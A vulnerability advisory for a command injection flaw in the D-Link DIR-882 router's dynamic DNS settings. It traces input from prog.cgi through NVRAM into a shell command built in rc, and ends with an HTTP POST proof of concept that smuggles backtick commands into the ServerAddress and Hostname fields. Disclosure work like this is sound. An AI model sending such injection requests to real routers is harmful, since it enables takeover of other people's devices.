# Command Injection Vulnerability in `SetDynamicDNSSettings`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-882 Router                                        |
| Firmware Version     | DIR882A1_FW102B02                                            |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `prog.cgi` (input handling) and `rc` (DDNS startup routine)  |
| Data Flow            | Cross-binary propagation via NVRAM variables (`nvram_safe_set` → `nvram_safe_get`) |
| Exploit Path         | Attacker-controlled input `/SetDynamicDNSSettings/ServerAddress` → stored in NVRAM (`DDNSProvider`) → retrieved by `rc` → concatenated into DDNS command → executed via `twsystem`.Similarly, `/SetDynamicDNSSettings/Hostname` → stored in NVRAM (`DDNS`) → retrieved by `rc` → concatenated into command → executed via `twsystem`. |
| Prerequisites        | No sanitization of DDNS `ServerAddress` and `Hostname` fields; only partial string comparison is performed, insufficient to prevent injection. |

2. Exploitation Path

```c
// prog.cgi
int __fastcall sub_4438A4(int a1)
{
  ...
  if ( v6 == 1 )
  {
    ...
    v8 = webGetVarString(a1, "/SetDynamicDNSSettings/ServerAddress");
    if ( v8 )
    {
      nvram_safe_set("DDNSProvider", v8);
      v1 = webGetVarString(a1, "/SetDynamicDNSSettings/Hostname");
      if ( v1 )
      {
        nvram_safe_set("DDNS", v1);
        ...
}

// rc
int start_DDNS_ipv4()
{
  ...
  v6 = (const char *)nvram_safe_get("DDNSProvider");
  v7 = (const char *)nvram_safe_get("DDNS");
  ...
  if ( v5 == 1 )
  {
    result = *(unsigned __int8 *)v6;
    if ( *v6 )
    {
      result = *(unsigned __int8 *)v7;
      if ( *v7 )
      {
        result = (unsigned __int8)*v8;
        if ( *v8 )
        {
          result = (unsigned __int8)*v9;
          if ( *v9 )
          {
            if ( !strcmp(v6, "dyndns.org") || !strcmp(v6, "dyndns.com") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@dyndns.org "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else if ( !strcmp(v6, "oray.cn") || !strcmp(v6, "oray.com") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_server_name ddns.oray.com "
                "--dyndns_server_url /ph/update? --update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else if ( !strcmp(v6, "dlinkddns.org") || !strcmp(v6, "dlinkddns.com") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@dlinkddns.com "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else if ( strstr(v6, "no-ip") )
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@no-ip.com "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v10);
            }
            else
            {
              sprintf(
                v14,
                "%s -u %s -p %s -a %s --dyndns_system default@%s "
                "--update_period_sec %d &",
                v11,
                v12,
                v13,
                v7,
                v6,
                v10);
            }
            system("echo 1 > /tmp/ddnstate");
            return twsystem(v14, 1);
          }
        }
      }
    }
  }
  return result;
}
```

3. **Vulnerable Binaries:**  `prog.cgi` and `rc` (with cross-binary data flow).
4. 0-Day Command Injection Exploitation Path: 
   - In `prog.cgi`, line 8 executes `v8 = webGetVarString(a1, "/SetDynamicDNSSettings/ServerAddress")`. The input is subsequently stored at line 11 via `nvram_safe_set("DDNSProvider", v8)`. In `rc`, line 23 retrieves the stored value through `v6 = (const char *)nvram_safe_get("DDNSProvider")`. After string concatenation, the data is passed into line 102 `return twsystem(v14, 1)`, leading to a command injection vulnerability. The current logic merely compares `v6` against specific strings, which is insufficient to prevent command injection.
   - In `prog.cgi`, line 12 executes `v1 = webGetVarString(a1, "/SetDynamicDNSSettings/Hostname")`. The input is subsequently stored at line 15 via `nvram_safe_set("DDNS", v1)`. In `rc`, line 24 retrieves the stored value through `v7 = (const char *)nvram_safe_get("DDNS")`. After string concatenation, the data is passed into line 102 `return twsystem(v14, 1)`, leading to a command injection vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/prog.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Connection: close

SetDynamicDNSSettings/ServerAddress=dlinkddns.org;`INJECTED_COMMAND`
&SetDynamicDNSSettings/Hostname=test.example.com;`INJECTED_COMMAND`
```